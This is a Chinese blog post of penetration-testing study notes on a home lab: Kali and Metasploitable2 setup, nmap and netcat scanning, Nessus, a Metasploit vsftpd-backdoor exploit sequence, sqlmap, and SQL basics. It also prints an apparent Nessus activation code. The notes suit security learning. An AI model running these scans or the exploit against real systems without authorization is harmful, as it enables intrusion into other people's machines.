<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络安全 | Fyind's Blog</title><meta name="author" content="Fyind"><meta name="copyright" content="Fyind"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="网络安全 Vmware Workstation 桥接网络配置   image-20200919203643934  打开虚拟网络编辑器，发现没有桥接网络，点设置   image-20200919203722602  让桥接模式解上正确的网卡   image-20200919203838977  然后主机和虚拟机就可以互相ping通了   image-20200919204116816  环境搭建">
<meta property="og:type" content="article">
<meta property="og:title" content="网络安全">
<meta property="og:url" content="http://fyind.de/2020/09/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.html">
<meta property="og:site_name" content="Fyind&#39;s Blog">
<meta property="og:description" content="网络安全 Vmware Workstation 桥接网络配置   image-20200919203643934  打开虚拟网络编辑器，发现没有桥接网络，点设置   image-20200919203722602  让桥接模式解上正确的网卡   image-20200919203838977  然后主机和虚拟机就可以互相ping通了   image-20200919204116816  环境搭建">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fyind.de/img/pic1.PNG">
<meta property="article:published_time" content="2020-09-16T21:03:33.000Z">
<meta property="article:modified_time" content="2025-07-18T10:49:53.882Z">
<meta property="article:author" content="Fyind">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fyind.de/img/pic1.PNG"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "网络安全",
  "url": "http://fyind.de/2020/09/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/",
  "image": "http://fyind.de/img/pic1.PNG",
  "datePublished": "2020-09-16T21:03:33.000Z",
  "dateModified": "2025-07-18T10:49:53.882Z",
  "author": [
    {
      "@type": "Person",
      "name": "Fyind",
      "url": "http://fyind.de"
    }
  ]
}</script><link rel="shortcut icon" href="/img/pic1.PNG"><link rel="canonical" href="http://fyind.de/2020/09/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '网络安全',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head><body><div id="web_bg" style="background-image: url(https://fyindex.work/PicGo/liuyin.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pic1.PNG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">85</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">83</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">26</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/TUM%E7%AC%94%E8%AE%B0"><i class="fa-fw fas fa-folder-open"></i><span> TUM笔记</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yae.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Fyind's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">网络安全</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/TUM%E7%AC%94%E8%AE%B0"><i class="fa-fw fas fa-folder-open"></i><span> TUM笔记</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">网络安全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-09-16T21:03:33.000Z" title="Created 2020-09-16 21:03:33">2020-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-18T10:49:53.882Z" title="Updated 2025-07-18 10:49:53">2025-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="网络安全">网络安全</h1>
<h2 id="vmware-workstation">Vmware Workstation</h2>
<h3 id="桥接网络配置">桥接网络配置</h3>
<figure>
<img src="https://fyindex.work/PicGo/image-20200919203643934.png" alt="image-20200919203643934">
<figcaption aria-hidden="true">image-20200919203643934</figcaption>
</figure>
<p>打开虚拟网络编辑器，发现没有桥接网络，点设置</p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200919203722602.png" alt="image-20200919203722602">
<figcaption aria-hidden="true">image-20200919203722602</figcaption>
</figure>
<p>让桥接模式解上正确的网卡</p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200919203838977.png" alt="image-20200919203838977">
<figcaption aria-hidden="true">image-20200919203838977</figcaption>
</figure>
<p>然后主机和虚拟机就可以互相ping通了</p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200919204116816.png" alt="image-20200919204116816">
<figcaption aria-hidden="true">image-20200919204116816</figcaption>
</figure>
<h2 id="环境搭建">环境搭建</h2>
<h3 id="kali-linux">Kali Linux</h3>
<p>镜像下载</p>
<p>https://www.kali.org/downloads/</p>
<p>安装完虚拟机后，更新一下源</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br><span class="line">apt dist-upgrade</span><br></pre></td></tr></table></figure>
<p>源列表位置</p>
<p><code>/etc/apt/source.list</code></p>
<p>设置开机启动软件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable</span><br><span class="line">update-rc.d postgresql enable</span><br></pre></td></tr></table></figure>
<p>重启网络服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
<p>开启网卡</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 up</span><br><span class="line">ifup eth0</span><br></pre></td></tr></table></figure>
<h3 id="windows-server-2003">Windows Server 2003</h3>
<p>桥接网络的时候，要把自己的网络设置位自动分配ip地址。</p>
<h3 id="metasploitable2">Metasploitable2</h3>
<p>这个是一个用于漏洞利用的虚拟机，<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/metasploitable/">下载地址</a></p>
<p>默认用户名 <code>msfadmin</code> 密码 <code>msfadmin</code></p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200917213604936.png" alt="image-20200917213604936">
<figcaption aria-hidden="true">image-20200917213604936</figcaption>
</figure>
<p>点这个文件就能直接打开</p>
<h3 id="linux-常用命令">Linux 常用命令</h3>
<p>查看端口状态</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure>
<h2 id="第二阶段">第二阶段</h2>
<h3 id="安装-nessus">安装 Nessus</h3>
<p><a href="www.tenable.com/downloads/nessus">下载地址</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i nessus.deb</span><br></pre></td></tr></table></figure>
<p>启动服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nessusd.service</span><br></pre></td></tr></table></figure>
<p>然后在 <code>https://kali:8834</code> 来配置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/systemctl start nessusd.service</span><br></pre></td></tr></table></figure>
<p>激活码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9130-217B-F54B-E675-C833</span><br></pre></td></tr></table></figure>
<p>新建一个扫描 network basic scaning ，在底下输入ip就可以扫描了</p>
<h3 id="配置win2003远程桌面">配置win2003远程桌面</h3>
<p><code>我的电脑</code>右键属性 找到远程，把这两个勾选上</p>
<p>  <img src="https://fyindex.work/PicGo/image-20200920195532447.png" alt="image-20200920195532447"></p>
<p>由于必须要有有密码的用户，所以可以新建一个用户，</p>
<p>新建好了之后就可以选择用户</p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200920195820252.png" alt="image-20200920195820252">
<figcaption aria-hidden="true">image-20200920195820252</figcaption>
</figure>
<p>然后本地运行 <code>mstsc</code> 进行远程连接</p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200920200111916.png" alt="image-20200920200111916">
<figcaption aria-hidden="true">image-20200920200111916</figcaption>
</figure>
<p>输入对应ip地址</p>
<figure>
<img src="https://fyindex.work/PicGo/image-20200920200052540.png" alt="image-20200920200052540">
<figcaption aria-hidden="true">image-20200920200052540</figcaption>
</figure>
<h2 id="主机探测">主机探测</h2>
<h3 id="二层发现">二层发现</h3>
<h4 id="arping">arping</h4>
<p>只能对单个主机扫描</p>
<p>向对应ip地址发送一个数据包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arping -c 1 [ip]</span><br></pre></td></tr></table></figure>
<h4 id="netdiscover">netdiscover</h4>
<p>它可以对多主机进行扫描</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p>指定范围</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.9/24</span><br></pre></td></tr></table></figure>
<h3 id="三层发现">三层发现</h3>
<p>容易被防火墙过滤</p>
<h4 id="ping">ping</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping [ip]</span><br></pre></td></tr></table></figure>
<h4 id="fping">fping</h4>
<p>可以扫描多主机</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -g 192.168.1.0/24</span><br></pre></td></tr></table></figure>
<h4 id="hping3">hping3</h4>
<p>可以修改 ICMP 协议的具体内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 3 -1 192.168.1.1 --icmpcode 1</span><br></pre></td></tr></table></figure>
<h3 id="四层发现">四层发现</h3>
<p>比三层发现更为可靠，可以探测远程主机</p>
<h4 id="nmap">nmap</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping edu.51cto.com</span><br><span class="line">nmap [ip]</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://fyindex.work/PicGo/image-20200920210256528.png" alt="image-20200920210256528">
<figcaption aria-hidden="true">image-20200920210256528</figcaption>
</figure>
<h4 id="hping3-1">hping3</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 3 -udp [ip]</span><br></pre></td></tr></table></figure>
<h4 id="nwatch">nWatch</h4>
<p>这是在GitHub上的一个<a target="_blank" rel="noopener" href="https://github.com/Cyber-Forensic/nWatch">项目</a>，用python写的脚本</p>
<p>它需要<code>nmap</code>这个包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install python-nmap</span><br></pre></td></tr></table></figure>
<h2 id="端口扫描">端口扫描</h2>
<h4 id="nmap-1">nmap</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap [ip]</span><br></pre></td></tr></table></figure>
<h4 id="dmitry">dmitry</h4>
<p>tcp 端口扫描</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmitry -p [ip]</span><br></pre></td></tr></table></figure>
<h4 id="netcat">netcat</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz [ip] 20-30 </span><br></pre></td></tr></table></figure>
<h3 id="端口分类">端口分类</h3>
<ul>
<li>0-65535 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></span></li>
</ul>
<p>TCP 和UDP端口是独立的，两个协议的端口号也是独立的。可以同时拥有比如
235端口</p>
<h4 id="周知端口">周知端口</h4>
<p>0-1023, 其中 80是www服务，21是FTP服务</p>
<h4 id="动态端口">动态端口</h4>
<p>49152-65535 进行动态分配的端口</p>
<h4 id="注册端口">注册端口</h4>
<p>1024到49251.分配给已经安装的程序</p>
<h4 id="nmap获取banner">nmap获取Banner</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap [ip] --script banner -p [端口号]</span><br></pre></td></tr></table></figure>
<h4 id="dimitry获取banner">dimitry获取banner</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dimitry -pb [ip]</span><br></pre></td></tr></table></figure>
<p>netcat 获取banner</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv [ip] [端口]</span><br></pre></td></tr></table></figure>
<h3 id="端口操作系统信息获取">端口，操作系统信息获取</h3>
<h4 id="端口程序信息">端口程序信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p [端口] -sV [ip]</span><br></pre></td></tr></table></figure>
<h4 id="操作系统信息">操作系统信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O [ip]</span><br></pre></td></tr></table></figure>
<p>有授权下，完整测试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -A -v -T4 [ip]</span><br></pre></td></tr></table></figure>
<h2 id="漏洞扫描">漏洞扫描</h2>
<h3 id="系统漏洞扫描">系统漏洞扫描</h3>
<h4 id="扫描原理">扫描原理</h4>
<p>漏洞扫描器对漏洞进行扫描，来验证目标是否存在具体漏洞。也存在错误扫描，需要对漏洞进行验证</p>
<h4 id="nmap扫描漏洞">nmap扫描漏洞</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vuln [ip]</span><br></pre></td></tr></table></figure>
<h4 id="nessus">nessus</h4>
<p>使用者者比较多</p>
<h4 id="漏洞利用">漏洞利用</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search vsftpd</span><br><span class="line">user exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">show payloads</span><br><span class="line">set payload cmd/unix/interact</span><br><span class="line">show options</span><br><span class="line">set rhost [ip]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<h3 id="web应用漏洞扫描">Web应用漏洞扫描</h3>
<h4 id="owasp-zap">owasp-zap</h4>
<h4 id="nikto">nikto</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host [ip]</span><br></pre></td></tr></table></figure>
<p>漏洞利用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "codes.."</span><br></pre></td></tr></table></figure>
<h1 id="ctf">CTF</h1>
<h3 id="工具">工具</h3>
<h4 id="curl">curl</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &lt;url&gt;</span><br></pre></td></tr></table></figure>
<p>可以查看请求，回复，以及源代码</p>
<h2 id="sql-语法基础">SQL 语法基础</h2>
<ol type="1">
<li>查询语句</li>
</ol>
<p>select 字段 1, 字段 2,… from 表名 ; 查询结果重命名使用 : as 重命名
eg: select uname,uid as userId from t_user; 查询所有字段使用“ * ” ：
select * from 表名 ;</p>
<ol start="2" type="1">
<li>条件查询</li>
</ol>
<p>select 字段 1, 字段 2,… from 表名 where 条件 ; select 字段 1, 字段
2,… from 表名 where 某字段 between X and Y;( 等同于大于等于 X 小于等于 Y
，若是字符串则按字典序 ) select 字段 1, 字段 2,… from 表名 where 某字段
is [not] null;( 字段为空 [ 非空 ]) select 字段 1, 字段 2,… from 表名
where 某字段 in (A , B);( 找出某字段等于 A 或者 B 的信息，等同于 or)</p>
<ol start="3" type="1">
<li>模糊查询</li>
</ol>
<p>select 字段 1, 字段 2,… from 表名 where 某字段 like ‘%a_’;
注意：在模糊查询当中’ %‘ 代表多个字符，’ _’ 代表一个字符；</p>
<ol start="4" type="1">
<li>排序</li>
</ol>
<p>select 字段 1, 字段 2,… from 表名 order by 某字段 [asc,desc],…;
注意：默认是升序。指定排列顺序使用 asc 或者 desc 修饰；</p>
<ol start="5" type="1">
<li>分组排序</li>
</ol>
<p>select sum( 某字段 ) from 表名 ; 注意：分组函数不能直接出现在 where
语句里；分组函数自动忽略 NULL ；分组函数依赖于 “group by”</p>
<ol start="6" type="1">
<li>单行处理函数</li>
</ol>
<p>ifnull 函数： ifnull( 字段 , 目标值 ) 如果字段不为 NULL ，则 IFNULL
函数返回字段 ; 否则返回 目标值；</p>
<ol start="7" type="1">
<li>分组查询</li>
</ol>
<p>group by : 按照某个字段或者某些字段进行分组； having :
对分组之后的数据进行再过滤。 select 分组函数 , 分组字段 ,… from 表名
group by 某字段 ,…; select 分组函数 , 分组字段 ,… from 表名 group by
某字段 ,…having 条件 ;</p>
<ol start="8" type="1">
<li>去除重复记录</li>
</ol>
<p>select distinct 字段 1, 字段 2,… from 表名 ;</p>
<ol start="6" type="1">
<li>单行处理函数</li>
</ol>
<p>ifnull 函数： ifnull( 字段 , 目标值 ) 如果字段不为 NULL ，则 IFNULL
函数返回字段 ; 否则返回 目标值；</p>
<ol start="7" type="1">
<li>分组查询</li>
</ol>
<p>group by : 按照某个字段或者某些字段进行分组； having :
对分组之后的数据进行再过滤。 select 分组函数 , 分组字段 ,… from 表名
group by 某字段 ,…; select 分组函数 , 分组字段 ,… from 表名 group by
某字段 ,…having 条件 ;</p>
<ol start="8" type="1">
<li>去除重复记录</li>
</ol>
<p>select distinct 字段 1, 字段 2,… from 表名 ;</p>
<p>创建数据库： create database 数据库名 创建数据库： create table
数据库名 创建表 : create table 表名 ( 字段名 1 数据类型 default 默认值 ,
字段名 2 数据类型 [ 单一 约束 ], … [ 联合约束 ( 字段 1, 字段 2)] );</p>
<p>insert 语句（插入） 语法格式： insert into 表名 ( 字段名 1, 字段名 2,
字段名 3,…) value ( 值 1, 值 2, 值 3,…),[( 值 1, 值 2, 值 3,…) 插入多行
];
注意：字段数量和值的数量相等，数据类型要对应；未插入值的字段为默认字段；
update 语句（修改） 语法格式： update 表名 set 字段名 1 = 值 1, 字段名 2
= 值 2,… where 条件 ; delete 语句（删除） delete from 表名 where 条件 ;(
删除大表，截断式删除 )</p>
<h4 id="显示">显示</h4>
<p>用户</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">user</span>()</span><br></pre></td></tr></table></figure>
<p>数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database()</span><br></pre></td></tr></table></figure>
<h4 id="字符串">字符串</h4>
<p>字符串也可以作为bytes来写</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x616263</span> <span class="operator">=</span> <span class="string">'abc'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="sqlite">Sqlite</h3>
<p>注释是 <code>--</code></p>
